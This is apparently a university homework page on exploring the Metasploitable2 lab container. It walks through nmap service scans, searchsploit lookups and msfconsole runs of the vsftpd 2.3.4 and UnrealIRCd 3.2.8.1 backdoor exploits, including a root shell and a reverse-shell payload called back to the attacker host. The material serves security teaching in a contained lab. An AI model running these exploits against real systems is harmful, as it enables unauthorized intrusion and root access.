Metasploitable2 Exploration
=================

[Go up to the NWS HW page](../index.html) ([md](../index.md))

### Overview

In this assignment you will explore the metasploit Docker container.  This container, based on the [Metasploitable 2 setup](https://docs.rapid7.com/metasploit/metasploitable-2/), and the [tleemcjr/metasploitable2 Docker image](https://hub.docker.com/layers/tleemcjr/metasploitable2/latest/images/sha256-e559450b37dccc1909eafa2df5b20bb052e1bd801246f4539a3ef183d5f7288a), is an intentionally vulnerable container where one can practice exploits.  We will be working through a few of the [intentional exploits](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) in the image.

You will be submitting a [metasploit.py](metasploit.py.html) ([src](metasploit.py)) Python file.


### Changelog

Any changes to this page will be put here for easy reference.  Typo fixes and minor clarifications are not listed here.  <!-- So far there aren't any significant changes to report. -->

- Wed, Feb 14: There was an errant character on line 66 of metasploit.py](metasploit.py.html) ([src](metasploit.py)); that character has to be removed for the metasploit.py file to parse correctly when submitted to Gradescope.


### Investigation

#### `nmap`

First we want to see what service are available on that container.  From *outer1*, run `nmap`.  We saw `nmap` in the [Network commands introduction](../netcmds/index.html) ([md](../netcmds/index.md) homework.  We will use the `-sV` parameter, as that will attempt to identify which service, including version, is running on each port.  This will take some time -- perhaps 3-5 minutes.  Note that it takes the metasploit container a bit of time (up to 30 seconds on a slow computer) to load all the services when the container first starts up.

```
root@outer1:/# date;nmap -sV metasploit;date
Thu Jan 25 08:15:00 EST 2024
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-25 08:15 EST
Nmap scan report for metasploit (192.168.100.3)
Host is up (0.0000020s latency).
Not shown: 980 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec?
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  landesk-rc  LANDesk remote management
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8180/tcp open  unknown
MAC Address: 02:42:C0:A8:64:03 (Unknown)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.65 seconds
Thu Jan 25 08:18:09 EST 2024
root@outer1:/# 
```

#### `searchsploit`

Installed on the Docker images is a database of known vulnerabilities and their exploits.  `searchsploit` will search that database for the string passed in as a command line parameter.  For example, we will investigate the [vsFTPd 2.3.4 vulnerability](https://www.cve.org/CVERecord?id=CVE-2011-2523) that you examined in the [Docker setup homework](../docker/index.html) ([md](../docker/index.md)).  This is the one where, if you end your username with `:)`, it will open up a shell on port 6200 that you can access (with full root permissions) via `nc metasploit 6200`.


```
root@outer1:/# searchsploit vsftpd
[i] Found (#2): /usr/local/exploitdb/files_exploits.csv
[i] To remove this message, please edit "/root/.searchsploit_rc" which has "package_array: exploitdb" to point too: path_array+=("/usr/local/exploitdb")

[i] Found (#2): /usr/local/exploitdb/files_shellcodes.csv
[i] To remove this message, please edit "/root/.searchsploit_rc" which has "package_array: exploitdb" to point too: path_array+=("/usr/local/exploitdb")

--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                         | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                         | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                         | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                       | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                              | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                 | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                                | multiple/remote/49719.py
--------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@outer1:/# 
```

We can see that vulnerability toward the bottom of that list -- the ones with the 2.3.4 in the version column.

### `msfconsole`

The Metasploit Framework console is a means to test out already written exploits.  It has a huge database of exploits -- many tens of thousands.  Each of these can be used on any host, whether it is on the metasploit container or on the real Internet.

Normally one would want to update the exploit database via `msfupdate`.  This won't matter for our usage in this course, as the exploits we are working on are a bit older.  Also, since we are in a container, we would have to update it each time the container starts.

Launch the console via running `msfconsole`.  After a bit of a startup delay, you will get a `msf6 > ` prompt.

We are going to work through the same [vsFTPd 2.3.4 vulnerability](https://www.cve.org/CVERecord?id=CVE-2011-2523) that you examined in the [Docker setup homework](../docker/index.html) ([md](../docker/index.md)), so that you can see a different way to exploit this vulnerability.

In the console, run `search vsftpd`.  This will search for all exploits that have that string as part of the name or description:

```
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > 
```

This list is smaller than the list you found in the previous section (via `searchsploit`).  The `searchsploit` command will list all the exploits in the database, but not all of them have been written programmatically in such a way that they can be used with `msfconsole`, which is why the `msfconsole` list is smaller.

Of the ones shown, we want to use the second one, which is number 1 in the list, so we enter `use 1`.  This will give us a different prompt (`msf6 exploit(unix/ftp/vsftpd_234_backdoor) > `), as we have loaded up an exploit.

To find information about the exploit, enter `info`:

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/u
                                     sing-metasploit.html
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the	VSFTPD download
  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
  June 30th 2011 and July 1st 2011 according to the most recent information
  available. This backdoor was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html


View the full module info with the info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```

Notice in the "target options" section, it gives us two variables that can be set.  To execute the exploit, we need to tell it what target to attack.  We could set the port (`RPORT`), but we'll keep it as the default port 21 (the standard port for FTP).  We have to set the RHOST variable (via `set RHOST <target>`) to set this value:

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST metasploit
RHOST => metasploit
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```

To execute the exploit, we enter `run`.  This particular one needs it entered twice -- once to open the shell, and the second time to use it.  The first time you run it, it will pause after the prompt, `USER: 331 Please specify the password`; that's showing you what the vsFTPd client output, but you don't have to enter the password -- the programmed exploit does that.

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.100.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.100.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.100.3:21 - The port used by the backdoor bind listener is already open
[+] 192.168.100.3:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.100.101:46311 -> 192.168.100.3:6200) at 2024-01-25 08:44:39 -0500

whoami
root

cat /etc/ssh/ssh_host_rsa_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcd
YfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+d
lEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew== 
root@metasploitable

exit
[*] 192.168.100.3 - Command shell session 1 closed.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```

We exited the exploited shell with `exit`.  When back on the msfconsole prompt, you can unload this exploit via `back`.  To exit msfconsole, enter `exit`.

Although we won't do this, this process is one way that attackers perform exploits against targets on the Internet.


### UnrealIRCD Exploit

If you look back at the `nmap -sV` output from above, you will see this line:

```
6667/tcp open  irc         UnrealIRCd
```

[IRC](https://en.wikipedia.org/wiki/Internet_Relay_Chat), or Internet Relay Chat, is an instant messaging system.  It used to be very common many years ago, but has largely been replaced by other, more modern, applications.  It is running on port 6667 (the default port for `irc`).

The `-sV` options to `nmap` attempted to determine the version of UnrealIRCd running, but it was not able to do so with just those parameters.  `nmap` has a series of scripts that come with it, and these scripts can be utilized to find more information about a port, a service, or a vulnerability.  These scripts are in `/usr/share/nmap/scripts`, if you are interested.  We could ask `nmap` to run those scripts on a given host via `nmap --script irc-* metasploit`.  This means to run *all* the scripts found via `ls /usr/share/nmap/scripts/irc-*`.  There are scripts to brute force passwords (`irc-brute.nse`), find more information about the server (`irc-info.nse`), etc.  The brute force one, in particular, will take quite some time to run.  And we only want to find more information about the version number, so we decide to only use the `irc-info.nse` script.  As we know the port we want to investigate, we tell it to only look at that port (`-p 6667`), rather than all ports.

```
root@outer2:~# nmap -p 6667 --script irc-info metasploit
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-30 10:11 EST
Nmap scan report for metasploit (192.168.100.3)
Host is up (0.000023s latency).

PORT     STATE SERVICE
6667/tcp open  irc
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 1 days, 17:41:43
|   source ident: nmap
|   source host: CAC88821.2ADA0512.FFFA6D49.IP
|_  error: Closing Link: gwscbkono[192.168.100.102] (Quit: gwscbkono)
MAC Address: 02:42:C0:A8:64:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
root@outer2:~# 
```

The version is listed there: `version: Unreal3.2.8.1`.  As it turns out, there is a vulnerability with that version of UnrealIRCd: [CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075).

Now, in `msfconsole`, we can search for an exploit for that version of UnrealIRCd.  Below are the commands to enter, and commentary on them, but the output is not shown here.  You should run this on one of the outer? Docker containers.  To start, run `msfconsole` from the command line.  Enter the following commands below, so that you understand what is going on, and so that you can see the output.

- `search unrealircd`: this finds all the exploits (only one) for that application.  We would need to verify that the version numbers match, and in this case they do -- port 6667 on *metasploit* is running version 3.2.8.1, which is what the one and only exploit uses.
  - Note from the output that the module name is `exploit/unix/irc/unreal_ircd_3281_backdoor`, and the module description is `UnrealIRCD 3.2.8.1 Backdoor Command Execution`; this will become relevant below.
- `use 0`: use the exploit by the number displayed.
- `info`: shows information about the loaded module, including the variables that can be set.
  - Notice that `RHOSTS` is required, but not yet set.
- `show options`: shows just the variables that can be set, and not the rest of the information.
  - As above, notice that `RHOSTS` is required, but not yet set.
- `set rhosts metasploit`: set the target node to exploit.
- `exploit`: run the exploit
  - Well, that didn't work.  Notice the output: `Exploit failed: A payload has not been selected`
- `show payloads`: these are the compatible payloads for this attack.  We'll pick the `payload/cmd/unix/reverse` one, which is listed as number 6.
- `set payload 6`: select the payload to use from the list just displayed.
- `exploit`: run the exploit
  - Well, that didn't work.  Notice the output: `The following options failed to validate: LHOST`
- `show options`: show the options again
  - Notice that `LHOST` is required, but not set
- `set lhost 192.168.100.102`: this needs to be set to the (non-localhost) IP address of the machine we are running the exploit on.
- `exploit`: it works!

The output from the last `exploit` is:

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP double handler on 192.168.100.102:4444 
[*] 192.168.100.3:6667 - Connected to 192.168.100.3:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.100.3:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo FUkOSc1MRDhkbUwW;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.100.102:4444 -> 192.168.100.3:45318) at 2024-01-30 10:22:37 -0500


Shell Banner:
FUkOSc1MRDhkbUwW
-----
```

At this point, we can type in any command (`whoami`, `pwd`, `ls`, etc.), and it will run that on *metasploit*.


### One more

The final part of this assignment is for you to pick an exploit.  Pick a service or port on *metasploit* that you want to attack.  You can't pick the two services that we used as examples here (vsFTPd or UnrealIRCd).  Scan the *metasploit* container with the nmap command shown above.  Given the version of the service, as well as the other information that `nmap` provides, look up the exploit via `searchsploit`.  Then you can execute it in `msfconsole`.  The intent of this part is for you to use the exploit in `msfconsole`, not to write one of your own.  Your exploit does not have to be a shell, just something that makes use of a vulnerability in the *metasploit* container.  Note that `msfconsole` has many (thousands?) of exploits, but not all work on *metasploit*.  You need to check the versions, described above, to see which ones work.

Whatever exploit you choose, you will need to copy the module name and description.  For example, in the vsFTPd example from above, `msfconsole` output the following:

```
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > 
```

In this example, as we used the (#1), the script name is `exploit/unix/ftp/vsftpd_234_backdoor`, and the description is `VSFTPD v2.3.4 Backdoor Command Execution`.

You will provide information about which one you selected in the [metasploit.py](metasploit.py.html) ([src](metasploit.py)) Python file.


### Explore

You are welcome to explore any and all exploits with `msfconsole`, but it is not required for this assignment.  Just be sure to only use them on the *metasploit* container!  Note that there are three versions of the Metasploitable framework -- [1](https://www.metasploit.com), [2](https://docs.rapid7.com/metasploit/metasploitable-2/), and [3](https://github.com/rapid7/metasploitable3).  We are using version 2 of the framework, as that one was available as an already configured Docker container.  

You can find a how-to guide to using version 2 [here](https://www.exploit-db.com/docs/english/44040-the-easiest-metasploit-guide-you’ll-ever-read.pdf).  You are also welcome to use online guides, such as [this one](https://www.hackingarticles.in/comprehensive-guide-on-metasploitable-2/).  Using the various exploits starts on page 43.  We've already done the first one.  Note that this document uses a Nessus scan, and we used `nmap`.




### Submission

You will be submitting and edited version of [metasploit.py](metasploit.py.html) ([src](metasploit.py)).

